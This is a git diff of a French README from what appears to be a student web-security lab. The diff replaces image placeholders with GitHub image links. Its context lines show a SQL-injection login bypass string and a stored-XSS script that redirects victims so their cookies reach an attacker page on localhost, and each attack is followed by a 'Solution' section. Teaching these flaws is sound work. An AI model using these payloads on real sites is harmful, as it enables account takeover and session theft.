@@ -14,7 +14,7 @@ Ici nous verons que même un utilisateur qui n’a pas de compte peut se connect
 Dans la page de connexion nous rentrons le pseudo d’un utilisateur existant toto par exemple et password qui n’est pas celle de l’utilisateur toto: " or ""="
 et on vois que nous sommes connectés comme etabt l’utilisateur toto. Ce qui nous permet de créer des sujets en tant que utilisateur toto
 
-*image*
+![](https://github.com/ang67/Projet-secu-webapp/blob/main/img/1.png)
 
 ## Solution
 
@@ -49,13 +49,15 @@ Maintenant l’attainjectons un code javascript dans un message ou dans un sujet
 
 `<script>document.location="http://localhost/siteattaquant?cookie="+document.cookie;</script>`
 
-*image*
+![](https://github.com/ang67/Projet-secu-webapp/blob/main/img/2.png)
 
 Maintenant l’attaquant a réussi son coup et s’attend à recoter le buttin. Si un l’utilisateur se connect en accèptant que le site se souvienne de lui, ou pour d’autres cookies par exemple, l’attaquant récupère alors toutes ces données sensibles dans un repertoire (`C:\wamp64\www\siteAttaquant\stolen_data.txt`) lors de sa visite sur la page contenant le code injecté.
 
-*image*
-*image*
-*image*
+![](https://github.com/ang67/Projet-secu-webapp/blob/main/img/3.png)
+
+![](https://github.com/ang67/Projet-secu-webapp/blob/main/img/4.png)
+
+![](https://github.com/ang67/Projet-secu-webapp/blob/main/img/5.png)
 
 ## Solution
 
